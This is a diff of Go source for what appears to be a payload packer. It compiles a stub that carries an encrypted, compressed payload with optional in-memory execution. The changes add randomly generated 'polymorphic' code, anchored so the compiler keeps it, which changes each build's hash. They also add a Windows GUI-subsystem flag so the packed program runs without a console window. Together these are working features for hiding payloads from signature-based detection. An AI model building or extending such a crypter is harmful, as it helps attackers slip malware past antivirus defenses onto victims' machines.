@@ -26,10 +26,35 @@ func CompileStub(config *PackConfig, metadata *PayloadMetadata, payload []byte) 
 	if err != nil {
 		return nil, fmt.Errorf("failed to create temp dir: %w", err)
 	}
-	defer os.RemoveAll(tmpDir)
+	defer func(path string) {
+		_ = os.RemoveAll(path)
+	}(tmpDir)
 
-	// Scrivi stub source (NON embeddiamo i dati, li appenderemo dopo)
+	// Scrivi stub source (con eventuale iniezione di variante polimorfica)
 	stubPath := filepath.Join(tmpDir, "stub.go")
+
+	// Integra generatore di varianti avanzato nel codice stub se abilitato
+	if config.PolymorphicStub {
+		gen := NewStubTemplateGenerator()
+		variant := gen.GenerateVariant(randomInt(1_000_000))
+		// Prova ad estrarre il nome della funzione generata per ancorarla ed evitare DCE
+		funcName := extractFirstFuncName(variant.SourceCode)
+		if funcName != "" {
+			anchor := "\n\n// === Polymorphic variant injection (auto-generated) ===\n" +
+				variant.SourceCode +
+				"\n\n// Anchor the variant to prevent dead-code elimination\n" +
+				"func init() {\n" +
+				"\t_ = 0\n" +
+				"\tbuf := []byte{0} // dummy buffer\n" +
+				"\t" + funcName + "(buf, byte(0))\n" +
+				"}\n"
+			stubSource += anchor
+		} else {
+			// In caso non si riesca ad estrarre il nome, includi comunque il codice (potrebbe ancora influire sull'hash)
+			stubSource += "\n\n// === Polymorphic variant (unanchored) ===\n" + variant.SourceCode + "\n"
+		}
+	}
+
 	if err := os.WriteFile(stubPath, []byte(stubSource), 0644); err != nil {
 		return nil, fmt.Errorf("failed to write stub source: %w", err)
 	}
@@ -63,8 +88,14 @@ require (
 		outputPath += ".exe"
 	}
 
+	ldflags := "-s -w"
+	if targetOS == "windows" {
+		// Build as GUI subsystem to avoid opening a console window for GUI apps
+		ldflags += " -H=windowsgui"
+	}
+
 	cmd := exec.Command("go", "build",
-		"-ldflags", "-s -w", // Strip symbols
+		"-ldflags", ldflags, // Strip symbols and set subsystem
 		"-o", outputPath,
 		stubPath,
 	)
@@ -147,75 +178,48 @@ func serializeMetadataForStub(m *PayloadMetadata, config *PackConfig) []byte {
 	return result
 }
 
-// injectMetadata sostituisce i placeholder nel codice stub con i dati reali
-func injectMetadata(source string, metadata *PayloadMetadata, payload []byte, config *PackConfig) string {
-	// Converti payload in formato Go byte slice literal
-	payloadLiteral := bytesToGoLiteral(payload)
-
-	// Converti key e nonce
-	keyLiteral := bytesToGoLiteral(metadata.EncryptionKey)
-	nonceLiteral := bytesToGoLiteral(metadata.EncryptionNonce)
-
-	// Converti padding offsets
-	paddingLiteral := intsToGoLiteral(metadata.PaddingOffsets)
-
-	// Sostituzioni
-	replacements := map[string]string{
-		"/* PAYLOAD_PLACEHOLDER */":           payloadLiteral,
-		"/* KEY_PLACEHOLDER */":               keyLiteral,
-		"/* NONCE_PLACEHOLDER */":             nonceLiteral,
-		"/* SIZE_PLACEHOLDER */":              fmt.Sprintf("%d", metadata.OriginalSize),
-		"/* COMP_ALGO_PLACEHOLDER */":         metadata.CompressionAlgo,
-		"/* ENC_ALGO_PLACEHOLDER */":          metadata.EncryptionAlgo,
-		"/* PADDING_PLACEHOLDER */":           paddingLiteral,
-		"false // /* INMEMORY_PLACEHOLDER */": fmt.Sprintf("%t", config.InMemoryExecution),
-	}
-
-	result := source
-	for placeholder, value := range replacements {
-		result = strings.ReplaceAll(result, placeholder, value)
-	}
-
-	return result
-}
-
-// bytesToGoLiteral converte []byte in stringa literal Go (solo contenuto, senza []byte{})
-func bytesToGoLiteral(data []byte) string {
-	if len(data) == 0 {
-		// Per slice vuoto, usa syntax  che funziona sia con `= []byte{}` che `= []byte{nil}`
+// extractFirstFuncName attempts to find the first function name declared in the provided Go source.
+// It looks for a pattern starting with "func " and extracts the identifier before the opening parenthesis.
+func extractFirstFuncName(src string) string {
+	idx := strings.Index(src, "func ")
+	if idx == -1 {
 		return ""
 	}
-
-	// Usa formato hex per compattezza: 0x12, 0x34, 0x56, ...
-	var buf strings.Builder
-
-	for i, b := range data {
-		if i > 0 {
-			buf.WriteString(", ")
-		}
-		if i%16 == 0 && i > 0 {
-			buf.WriteString("\n\t\t")
-		}
-		buf.WriteString(fmt.Sprintf("0x%02x", b))
+	start := idx + len("func ")
+	// skip optional receiver: look for first identifier followed by '('; if next char is '(', it's a receiver
+	// We implement a simple scan: if the first non-space after 'func ' is '(', skip the receiver '(...)' then read name
+	i := start
+	for i < len(src) && (src[i] == ' ' || src[i] == '\n' || src[i] == '\t') {
+		i++
 	}
-
-	return buf.String()
-}
-
-// intsToGoLiteral converte []int in stringa literal Go (solo contenuto, senza []int{})
-func intsToGoLiteral(data []int) string {
-	if len(data) == 0 {
-		return ""
-	}
-
-	var buf strings.Builder
-
-	for i, val := range data {
-		if i > 0 {
-			buf.WriteString(", ")
+	if i < len(src) && src[i] == '(' {
+		// skip receiver
+		depth := 1
+		i++
+		for i < len(src) && depth > 0 {
+			if src[i] == '(' {
+				depth++
+			} else if src[i] == ')' {
+				depth--
+			}
+			i++
 		}
-		buf.WriteString(fmt.Sprintf("%d", val))
+		for i < len(src) && (src[i] == ' ' || src[i] == '\n' || src[i] == '\t') {
+			i++
+		}
 	}
-
-	return buf.String()
+	// now i at start of name
+	j := i
+	for j < len(src) {
+		c := src[j]
+		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_' {
+			j++
+			continue
+		}
+		break
+	}
+	if j > i {
+		return src[i:j]
+	}
+	return ""
 }
